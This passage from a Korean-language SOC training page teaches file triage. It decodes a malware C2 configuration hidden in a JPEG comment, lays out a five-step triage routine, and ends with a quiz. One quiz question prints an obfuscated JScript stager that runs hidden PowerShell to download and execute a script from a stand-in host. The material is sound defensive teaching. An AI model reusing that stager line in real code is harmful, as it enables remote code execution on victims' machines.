meme_0412.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 0x0, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6, manufacturer=Canon, xresolution=92, yresolution=100, resolutionunit=1], comment: "eyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=", baseline, precision 8, 64x64, components 3
```

- `JPEG image data, JFIF standard 1.01` — 진짜 JPEG입니다. 실행 파일이 변장한 게 아니니 "진짜 그림이야?"만 묻는 검사는 통과합니다.
- `Exif Standard: [... manufacturer=Canon ...]` — 휴대폰이나 카메라 사진처럼 카메라 제조사가 든 EXIF 블록이 있습니다.
- `comment: "eyJjMiI6..."` — `file`이 JPEG 주석을 찍어 주는데, 긴 Base64 문자열입니다. 진짜 카메라는 이런 주석을 쓰지 않습니다. 시작 부분의 `eyJ`는 외워 둘 만합니다. `{"`를 Base64로 바꾸면 이렇게 되니, **`eyJ`는 거의 언제나 Base64로 인코딩한 JSON**입니다(모든 JSON Web Token의 첫머리에서도 봅니다).
- `64x64, components 3` — 64×64짜리 아주 작은 컬러 그림입니다. 진짜 밈이나 사진은 훨씬 크니, 작은 그림에 긴 주석이 붙은 것부터가 이상합니다.

`exiftool`은 메타데이터를 이름 붙은 칸으로 보여 줍니다. 두 파일을 나란히 보죠.

```text
$ exiftool -Comment -Artist -Make -Model -FileType -MIMEType meme_0412.jpg holiday.jpg
======== meme_0412.jpg
Comment                         : eyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=
Artist                          : admin
Make                            : Canon
File Type                       : JPEG
MIME Type                       : image/jpeg
======== holiday.jpg
Make                            : Canon
Camera Model Name               : EOS 250D
File Type                       : JPEG
MIME Type                       : image/jpeg
    2 image files read
```

- `exiftool -Comment -Artist ...` — 이 태그들만 달라고 합니다. 목록 없이 돌리면 `exiftool`은 찾은 태그를 전부 찍는데(진짜 사진이면 수십 개), 어디를 봐야 할지 모를 때 유용합니다.
- `meme_0412.jpg`: Base64로 가득한 `Comment`, `admin`인 `Artist`, `Make`는 있는데 `Camera Model Name`은 **없습니다.** 진짜 카메라는 제조사와 모델을 함께 쓰고(보통 노출, 날짜, 렌즈 칸도), 제조사만 있고 나머지가 없다면 카메라가 아니라 도구가 메타데이터를 썼다는 뜻으로 보입니다.
- `holiday.jpg`: 제조사와 모델, 주석 없음. 이게 정상의 모습입니다.
- 둘 다 `File Type JPEG` / `MIME Type image/jpeg`: 형식으로 보면 둘 다 멀쩡한 그림입니다. 바로 그게 요점입니다. 증거는 형식이 아니라 칸 안에 있습니다.

`exiftool`이 없어도(잠가 둔 장비라든지) `strings`로 찾을 수 있습니다.

```text
$ strings -t x -n 8 meme_0412.jpg
     93 VeyJjMiI6Imh0dHBzOi8vY2RuLXN5bmMuZXhhbXBsZS9hcGkiLCJzbGVlcCI6MzYwMCwiaWQiOiJieDE3In0=
```

- `-t x`는 위치(오프셋)를 16진수(`0x93`)로 찍고, `-n 8`은 8글자보다 짧은 줄을 숨겨서 압축된 그림 데이터에서 나오는 잡음을 대부분 없앱니다.
- 파일에서 유일하게 긴 문자열이 Base64 덩어리입니다. 평범한 사진에 `strings`를 돌리면 카메라 제조사와 모델, 날짜, 편집 프로그램 정도가 나옵니다. **코드, URL, Base64**처럼 생긴 게 있다면 그게 발견입니다.
- <strong>`eyJ` 앞의 `V`</strong>를 보세요. 메시지의 일부가 아닙니다. 같은 자리를 헥스로 보면 이유가 나옵니다.

```text
0000008c  6d 69 6e 00 ff fe 00 56  65 79 4a 6a 4d 69 49 36  |min....VeyJjMiI6|
0000009c  49 6d 68 30 64 48 42 7a  4f 69 38 76 59 32 52 75  |Imh0dHBzOi8vY2Ru|
```

- `6d 69 6e 00` — `min`과 0 바이트. EXIF 블록에 있는 작가 문자열 `admin`의 끝입니다.
- `ff fe` — JPEG의 **COM**(주석) 표시입니다. JPEG 파일은 `FF`와 종류 바이트로 시작하는 구간(segment)들로 이뤄집니다. `FF D8`은 그림 시작, `FF E1`은 EXIF, `FF FE`는 주석.
- `00 56` — 구간의 **길이**, 0x56 = 86바이트입니다. 길이 칸 자체 2바이트 + 주석 84글자. 그런데 바이트 `56`이 마침 찍히는 글자 `V`라서, `strings`가 앞에 붙여 버렸습니다. `strings` 출력에서 문자열을 복사할 때는 양 끝을 확인하세요. 앞에 길이나 종류 바이트가 하나 딸려 오는 일이 흔합니다.
- `65 79 4a 6a ...` — `eyJj...`, 주석 그 자체입니다.

풀어 봅니다(`eyJ`부터만).

```text
$ strings -n 8 meme_0412.jpg | grep -o 'eyJ[A-Za-z0-9+/=]*' | base64 -d
{"c2":"https://cdn-sync.example/api","sleep":3600,"id":"bx17"}
```

- `grep -o 'eyJ[A-Za-z0-9+/=]*'` — `eyJ`에서 매치를 시작하고(그래서 엉뚱한 `V`가 빠짐) Base64 글자가 이어지는 데까지 갑니다. `V`까지 넣고 풀면 `base64`는 쓰레기를 내놓습니다. 모든 글자가 4글자 묶음 안에서 한 칸씩 밀리기 때문입니다.
- 풀린 JSON은 악성코드 설정입니다. C2 URL(`https://cdn-sync.example/api`), 3,600초(한 시간에 한 번) 접속 간격, 캠페인이나 봇 ID `bx17`. 밈 그림에 이런 게 들어 있을 정상적인 이유는 없습니다. 적어 둘 IOC는 도메인, URL 경로, 그림의 해시와 출처 페이지입니다.

### 이런 걸 어떻게 잡나 { #supporting-detect }

- **파일에서**: 조사 중에 나온 그림(특히 수상한 프로세스가 내려받은 것)에 `exiftool`이나 `strings`를 돌려 메타데이터에 코드, URL, Base64가 있는지 봅니다. 그림 안에 Base64 덩어리나 스크립트 키워드(`eval`, `powershell`, `<script>`)가 있으면 바로 빨간불입니다. 스테가노그래피는 흔한 픽셀 숨기기 방법을 검사하는 도구가 있고, 엔트로피나 크기가 이상하면 추가 데이터가 있다는 힌트가 될 수 있지만, 잘 만든 샘플은 놓친다고 생각하세요.
- **끝 뒤에 붙은 데이터를 본다.** 어떤 로더는 그림의 끝 표시(JPEG은 `FF D9`, PNG는 `IEND`) 뒤에 페이로드를 그냥 **덧붙입니다.** 그림은 여전히 잘 보입니다. 시그니처 검색과 카빙([중첩 파일](file-identification.md#nested-files) 참고)으로 찾습니다.
- **호스트에서는 그림이 아니라 읽는 쪽을 잡는다.** 그림은 유명 사이트에서 받는 평범한 다운로드지만, **누가** 받는지는 평범하지 않습니다. 브라우저가 SNS에서 그림을 받는 건 정상입니다. `rundll32.exe`, `regsvr32.exe`, 스크립트 호스트, `%APPDATA%`의 서명 없는 바이너리가 같은 사이트에서 한 시간마다 그림을 받는다면 정상이 아닙니다. Sysmon 22(DNS)와 Sysmon 3(연결)에는 프로세스를 알려 주는 `Image` 칸이 있습니다. 이 패턴은 거기서 보입니다.
- **시간 간격을 본다.** 같은 프로세스가 같은 페이지에 규칙적으로(여기서는 3,600초마다) 접속한다면, 목적지가 평판 좋은 사이트라도 비콘(beacon)입니다.

## 정리: 의심 파일 알아보고 다루기 { #routine }

파일이 나쁠 수 있는지 빠르게 가리려면 다섯 가지 질문을 차례로 던집니다. 앞의 질문이 뒤의 것보다 싸고, 답이 분명해지면 바로 멈춥니다.

1. **익스플로잇이나 코드를 잘 나르는 형식인가?** 실행 파일과 DLL, 스크립트, Office 문서(매크로, 박힌 개체, 원격 템플릿), RTF, PDF, 바로 가기, 그리고 이런 것을 담은 디스크 이미지와 압축 파일. 그냥 `.txt`나 `.csv`는 공격 그 자체일 가능성이 훨씬 낮습니다(그래도 링크나 지시를 나를 수는 있습니다).
2. **해시나 서명으로 결론이 나나?** 해시 조회에서 알려진 악성코드가 나오면 분류는 끝나고 범위 파악이 시작됩니다. 예상한 게시자의 유효한 서명에 수년간 본 파일이면 안심이 됩니다. "처음 봄"도 "서명됨"도 혼자서는 조사를 끝내지 못합니다([해시와 서명](hashing-signatures.md) 참고).
3. **이 형식의 어떤 기능이 악용되나?** 링크, 박힌 파일과 개체, 자동 실행 동작(`Document_Open`, `/OpenAction`, `\objupdate`), 스크립트와 매크로, 원격 템플릿, 메타데이터. 형식을 알면 어디를 볼지 압니다.
4. **그 기능이 쓰이고 있나?** **안전하고 빠르게** 확인합니다. 샌드박스, 수동 정적 분석(`olevba`, `rtfobj`, `pdfid`, `strings`, `exiftool`), 격리되고 되돌릴 수 있는 OS에서의 동적 분석, 아니면 그냥 스크린샷 한 장.
5. **흔적은 무엇을 말하나?** 찾아낸 흔적을 전부 확인합니다. URL과 도메인 평판, 난독화된 스크립트 풀기, 박힌 파일은 모두 꺼내서 이 순서를 다시 돌리기.

1번과 3번 뒤에 있는 형식별 기능 지도입니다.

| 형식 | 악용되는 기능 | 첫 도구 |
| --- | --- | --- |
| PE(`.exe`, `.dll`, `.scr`, `.cpl`) | 그 자체가 코드: 전부 | 해시, `sigcheck`, `strings`, 샌드박스 |
| 스크립트(`.js`, `.vbs`, `.ps1`, `.hta`, `.bat`) | 내려받아 실행, 난독화 | `cat`/`less`, 정적 풀기, 4104 |
| Office(`.doc[m]`, `.xls[m]`, `.docx`) | 매크로, 박힌 개체, 링크, 원격 템플릿, 익스플로잇 | `oleid`, `olevba`, `unzip -l`, 샌드박스 |
| RTF(`.doc`로 이름을 바꾼 경우가 많음) | OLE 개체, 원격 템플릿, 익스플로잇 | `rtfobj`, 헥스 `4d5a`를 찾는 `strings` |
| PDF | 링크, QR 코드, 박힌 파일, JavaScript, 자동 동작 | `pdfid`, `pdf-parser`, `strings` |
| 바로 가기(`.lnk`) | 해석기를 실행하는 명령줄 | LNK 해석 도구, `strings -e l` |
| 그림 | 해석기 익스플로잇(드묾), 덧붙인 페이로드, 메타데이터나 픽셀 속 숨은 설정 | `file`, `exiftool`, `strings`, 카빙 |
| 압축 파일과 디스크 이미지(`.zip`, `.iso`, `.img`) | 위의 것들을 담는 그릇, 때로는 Mark of the Web을 피하는 데 씀 | `7z l`, 그다음 파일마다 반복 |

같은 다섯 질문을 이 페이지의 시험 파일 세 개에 적용하면 이렇습니다.

| 질문 | `Remittance_0412.docx` | `invoice_0412.ps1` | `meme_0412.jpg` |
| --- | --- | --- | --- |
| 1 위험한 형식? | 예(OOXML, 매크로 가능) | 예(스크립트) | 보통은 아님 |
| 2 해시 / 서명 | 새 해시, 서명 없음 | 새 해시, 서명 덩어리 없음 | 새 해시, 해당 없음 |
| 3 악용될 기능 | 매크로, 링크 | 내려받기, `IEX`, `ScriptBlock::Create` | 메타데이터, 픽셀, 덧붙인 데이터 |
| 4 쓰이고 있나? | 자동 실행 매크로와 미끼 그림 | Base64 + "문자열 실행" 패턴 | JPEG 주석 속 Base64 |
| 5 흔적 | 받는 사람 주소가 박힌 `docs-portal.example` | `https://cdn-sync.example/s2` | C2 `https://cdn-sync.example/api`, ID `bx17` |
| 판정 | 악성 미끼 | 악성 스테이저 | 악성코드는 아니지만 **악성코드 설정**: 이걸 읽는 감염 호스트를 찾는다 |

이건 악성코드 분석의 겉만 핥은 것이지만, 이 확인들만으로도 대부분의 파일이 수상한지 아닌지를 몇 분 안에 가를 수 있습니다. 더 나아가 악성코드를 뜯어서 기능과 통신 방식을 전부 이해하는 건 <strong>리버스 엔지니어링(reverse engineering)</strong>의 영역입니다. 프로그램의 디스어셈블과 디버깅, 악성 문서와 스크립트의 더 깊은 분석. 입문 고전은 *Practical Malware Analysis*(No Starch Press, 2012)입니다. 실습 환경은 세월이 느껴지지만(Windows XP, 32비트), 문자열부터 디버깅까지 이어지는 방법론은 지금도 통합니다. 요즘은 Ghidra, x64dbg 같은 무료 도구, 그리고 REMnux(Linux)와 FLARE-VM(Windows) 분석용 배포판과 함께 보면 됩니다. 모든 SOC에는 언젠가 이걸 할 수 있는 사람이 필요하고, 보람 있는 진로입니다.

## 정리: 호스트 파트에서 다룬 것 { #recap }

호스트 파트는 엔드포인트를 여러 방향에서 봤습니다. 전체를 꿰는 실은 이렇습니다.

- **[엔드포인트 공격](../endpoint-attacks/index.md)**: 공격자는 최초 침투 **이후**에 집중합니다. MITRE ATT&CK의 침투 후 전술, 즉 실행, 지속성, 탐색, 권한 상승, 자격 증명 접근, 측면 이동, 수집, 유출. 이 단계들을 알아야 정문에서만이 아니라 단계마다 탐지를 계획할 수 있습니다.
- **[엔드포인트 방어](../endpoint-defense/index.md)**: 그 단계들에 맞춘 호스트의 심층 방어. 자산 목록, 취약점 스캔과 패치, 익스플로잇 보호, Credential Guard, 방화벽과 백신, 응용 프로그램 통제, FIM, PAW와 권한 관리, EDR, DLP, UEBA, 감사 정책. 목표는 한 단계가 아니라 **모든** 단계에서 방해하고, 막고, 탐지하는 것입니다.
- <strong>[Windows 로그](../windows-logging/index.md)</strong>와 **[Linux 로그](../linux-logging/index.md)**: 이벤트가 실제로 어떻게 만들어지는지. Windows는 공급자, 채널, `.evtx`, Linux는 syslog, `/var/log`, 저널, auditd. SOC에서 가장 많이 보게 될 게 로그이니, 로그가 어떻게 만들어지는지 아는 건 선택이 아닙니다.
- **[꼭 알아야 할 이벤트](../important-events/index.md)**: 대부분의 조사를 떠받치는 이벤트 ID. 로그온, 프로세스 생성, 방화벽과 개체 접근, 서비스, 예약 작업과 USB, 계정, Defender와 PowerShell, 그리고 TGT와 서비스 티켓 이벤트가 있는 Kerberos.
- **[로그 파이프라인·SIEM](../log-pipeline/index.md)**: 호스트와 검색창 사이에서 일어나는 일. 수집, 형식과 구조, 보강, 정규화, 분류, 저장, 로그 수명 주기. SIEM에서 검색하는 건 1단계입니다. 각 이벤트가 어떻게 만들어지고, 옮겨지고, 바뀌었는지 알아야 데이터에 **더 좋은 질문**을 던질 수 있고, 빈 곳이 공격자 때문이 아니라 파이프라인 때문이라는 것도 알아챌 수 있습니다.
- **[파일 분석](index.md)**: 이름을 믿지 않고 파일의 진짜 정체를 알아보는 법, 단서를 뽑는 법, 안전하게 다루는 법, 공격자가 좋아하는 형식, 해시와 서명이 알려 주는 것과 못 알려 주는 것, 그리고 이 페이지의 빠른 확인들.

공통된 교훈은 이겁니다. 공격이 실제로 일어나는 곳은 엔드포인트이고, 그곳의 거의 모든 일은 기록할 수 있습니다. 어떤 이벤트가 중요한지 알고, 그게 수집되게 하고, 오는 길에 파이프라인이 무엇을 바꿨는지 이해한다면요.

!!! info "[변경됨] 바뀐 점"
    - **샌드박스 지형.** 원래 Cuckoo Sandbox는 관리되지 않고, 무료 서비스 malwr.com은 사라진 지 오래입니다. 지금 직접 설치하는 것으로는 주로 CAPE와 Cuckoo3을 씁니다. 온라인 서비스로는 Hybrid Analysis, ANY.RUN, Joe Sandbox, Triage가 있고, 대부분의 EDR과 메일 게이트웨이에도 들어 있습니다. 우리 기관의 요금제가 무엇을 공개하는지 확인하세요.
    - **미끼가 파일에서 클립보드로 옮겨 갔다.** 2022년부터 인터넷에서 온 매크로가 기본으로 차단되자, 많은 캠페인이 스크립트 첨부를 그만뒀습니다. 대신 웹 페이지("가짜 CAPTCHA", "이 오류를 고치세요", "사람인지 확인")가 사용자에게 명령을 실행 창이나 터미널에 붙여 넣으라고 시킵니다. ATT&CK는 이 "ClickFix" 패턴을 위해 **T1204.004 User Execution: Malicious Copy and Paste**를 추가했습니다. 분류할 파일이 없으니 탐지는 프로세스 생성(`explorer.exe` → 내려받기를 하는 `powershell.exe`나 `mshta.exe`)과 RunMRU 레지스트리 키에 기댑니다.

    - **양쪽 모두 AI.** 공격자는 생성형 AI로 그럴듯한 미끼를 쓰고 끝없이 다른 난독화 스크립트를 만들어, 해시와 문자열 기반 스크립트 탐지를 약하게 만듭니다. 방어 쪽은 샌드박스와 EDR 콘솔의 AI 도우미로 스크립트를 설명하고 풉니다. AI의 설명은 실마리로 쓰고, 풀어 낸 코드와 로그로 확인하세요.

    - **의심 문서를 "그냥 보려고" 업무용 PC에서 열지 마세요.** 미리 보기 창도 안 됩니다. 샌드박스나 되돌릴 수 있는 VM을 씁니다.
    - **샌드박스의 "자식 프로세스 없음"을 무해함으로 읽지 마세요.** 미끼는 클릭, 진짜 사용자, 특정 나라, 시간 지연이 필요할 수 있습니다. 행위와 정적 확인을 함께 봅니다.
    - **마지막 줄만 바꿔서 스크립트를 실행하는 식으로 풀지 마세요.** 정적으로, 한 겹씩, 절대 업무용 기기가 아닌 곳에서 풉니다.
    - **스크립트를 키워드 맞추기에 맡기지 마세요.** 난독화는 그걸 깨려고 있는 겁니다. 풀린 코드를 보는 4104, AMSI, 행위(누가 해석기를 띄웠고 어디로 접속했나)를 씁니다.
    - **"그냥 그림"이라고 그림을 넘기지 마세요.** 메타데이터와 끝에 붙은 데이터를 확인하고, 무엇보다 그걸 내려받은 프로세스를 찾습니다.
    - **난독화만으로 증거라고 하지 마세요.** 줄이거나 보호한 정상 코드도 있습니다. 풀린 코드가 하는 일과 출처로 판단합니다.

## 확인 문제 { #quiz }

### 문제 1

사용자가 "좀 이상해 보인다"며 `Contract_Renewal_2027.docx`라는 첨부를 전달했습니다. 동료가 스크린샷을 얻으려면 무료 공개 샌드박스에 올리자고 합니다. (a) 그걸 먼저 하면 어떤 위험이 있나요? (b) 대신 어떤 순서로 하겠습니까? (c) 결국 쓴 샌드박스가 "Click ENABLE CONTENT to view"가 적힌 흐린 페이지와 **자식 프로세스 없음**을 보여 줍니다. 판정은 무엇이고, 빈 프로세스 트리가 왜 판정을 바꾸지 못하나요?

??? success "정답과 해설"
    **(a)** 무료 공개 제출은 대개 누구나 볼 수 있습니다. 파일이 진짜라면 실제 계약서의 내용(과 스크린샷)이 공개됩니다. 표적 공격이라면 자기 샘플을 지켜보는 공격자가 우리가 찾아냈다는 걸 압니다. 문서에 개인 맞춤 링크가 있다면, 샌드박스가 그걸 따라가는 순간 어느 수신자가 조사했는지 공격자에게 알려 줍니다.

    **(b)** 먼저 SHA-256을 구해 **해시**를 조회합니다(내용은 하나도 밖으로 나가지 않음). 그다음 **비공개** 샌드박스(사내 설치나 제출물을 비공개로 두는 유료 요금제)나 나중에 되돌리는 내 스냅숏 VM을 씁니다. 정적 확인(매크로는 `oleid`/`olevba`, 링크와 원격 템플릿은 `unzip -l`과 관계 파일)도 함께 돌립니다. 공개 제출은 맨 마지막, 누가 봐도 흔한 샘플일 때만, 정책이 허락하면.

    **(c)** **악성 미끼.** 정상 계약서는 읽으려고 콘텐츠를 사용할 필요가 없습니다. 빈 프로세스 트리는 방아쇠(콘텐츠 사용 클릭)가 샌드박스에서 당겨지지 않았거나 샘플이 샌드박스를 알아챘다는 뜻일 뿐입니다. 매크로를 정적으로 확인하고, IOC(해시, URL, 보낸 사람)를 모으고, 어느 수신자의 `WINWORD.EXE`가 자식 프로세스를 띄웠는지 확인합니다.

### 문제 2

`scan_0412.js`라는 300바이트짜리 첨부의 전체 내용이 이 한 줄입니다.

```text
var a=['\x68\x74\x74\x70\x73\x3a\x2f\x2f','upd-cdn','.example/','g.ps1'];var s=new ActiveXObject('WScript.Shell');s['R'+'un']('powershell -w hidden -c "IEX(iwr '+a[0]+a[1]+a[2]+a[3]+')"',0);
```

(a) 악성 스크립트의 두 가지 표시를 짚으세요. (b) `\x68\x74\x74\x70\x73\x3a\x2f\x2f`는 무엇이고, 왜 이렇게 썼나요? (c) 사용자가 더블클릭했다면 4688과 4104에서 무엇이 보이고, 어떤 ATT&CK 기법에 해당하나요?

??? success "정답과 해설"
    **(a)** **작은 내려받아 실행 스테이저**: 하는 일이라고는 PowerShell을 띄워 `g.ps1`을 받아 `IEX`로 실행하는 것뿐인 300바이트. **난독화**: URL을 배열로 쪼개고 일부를 16진 이스케이프로 썼고, 메서드 이름 `Run`도 쪼개서(`'R'+'un'`) 키워드 스캐너가 놓치게 했습니다. 끝의 `0`은 "창 숨김"입니다.

    **(b)** `https://`를 JavaScript 16진 이스케이프로 쓴 것입니다(`\x68` = `h`, `\x74` = `t`, `\x3a` = `:`, `\x2f` = `/`). 이렇게 쓰면 파일 안에 `https://`라는 글자가 그대로 나오지 않아서, 단순한 URL 추출과 키워드 필터를 피합니다. 합치면 URL은 `https://upd-cdn.example/g.ps1`입니다.

    **(c)** **4688**: `wscript.exe`(부모 `explorer.exe`, 파일 `scan_0412.js`, 아마 다운로드 폴더나 `%TEMP%\Temp1_*.zip`), 이어서 부모가 `wscript.exe`이고 명령줄에 `-w hidden -c "IEX(iwr https://upd-cdn.example/g.ps1)"`가 든 `powershell.exe`. **4104**: `IEX(iwr ...)` 명령이 스크립트 블록으로, 그다음 `g.ps1`의 내용이 풀린 채로 블록들로. `g.ps1`은 디스크에 닿지 않는데도요. 기법: **T1204.002**(사용자가 악성 파일 실행), **T1059.007** JavaScript, **T1059.001** PowerShell, **T1027.010** 명령 난독화, **T1105** 도구 반입.

### 문제 3

조사 중에 Sysmon을 보니 `C:\Users\p.ng\AppData\Roaming\Lumen\lumen.exe`(서명 없음)가 `img.socialsite.example`을 질의하고 한 시간에 한 번 작은 JPEG을 내려받습니다. 받은 그림에 `strings -n 8`을 돌리면 `KeyJ0YXNrIjoic2xlZXAifQ==` 하나만 나옵니다. (a) 그림은 악성코드인가요? 무슨 역할인지 설명하세요. (b) 그 문자열 그대로 `base64 -d`하면 왜 실패하고, 어떻게 고치나요? 풀면 무엇이 나오나요? (c) 이 활동은 네트워크 트래픽과 호스트 중 어디서 잡기 쉬운가요? 왜인가요?

??? success "정답과 해설"
    **(a)** 그 자체로는 아닙니다. 그림 보기 프로그램으로 열면 그냥 그림입니다. **이미 실행 중인 악성코드에게 보내는 메시지**입니다. `lumen.exe`가 주기적으로 내려받아 거기서, 여기서는 메타데이터에서 지시나 설정을 읽습니다(데드 드롭 **T1102.001**, 그림 속에 데이터 숨기기 **T1001.002**). 악성코드는 `lumen.exe`이고, 그림은 증거이자 IOC 출처입니다.

    **(b)** 첫 글자 `K`는 거의 확실히 메시지의 일부가 아닙니다. 구간 머리말에서 딸려 온 찍히는 바이트(이 페이지 예제의 길이 바이트 `V`처럼)를 `strings`가 앞에 붙인 겁니다. 그걸 넣으면 모든 글자가 Base64 4글자 묶음 안에서 한 칸씩 밀려 쓰레기가 나옵니다. `eyJ`(`{"`의 Base64)부터 시작합니다. `grep -o 'eyJ[A-Za-z0-9+/=]*' | base64 -d`를 하면 `{"task":"sleep"}`, 악성코드에게 조용히 있으라는 명령이 나옵니다.

    **(c)** **호스트에서.** 네트워크에서 보면 유명 사이트에서 그림을 받는 평범한 HTTPS 요청이라 웹 서핑처럼 보입니다. 호스트에서는 Sysmon 22/3이 **어느 프로세스가** 요청했는지 보여 줍니다. `AppData\Roaming`의 서명 없는 바이너리가 정확히 한 시간마다 그림을 받는 건 정상이 아니고, 브라우저가 같은 일을 하는 건 정상입니다. 규칙적인 간격(비콘)과 프로세스의 정체가 탐지 포인트이고, 그게 `lumen.exe`와 그 지속성으로 이끌어 줍니다.
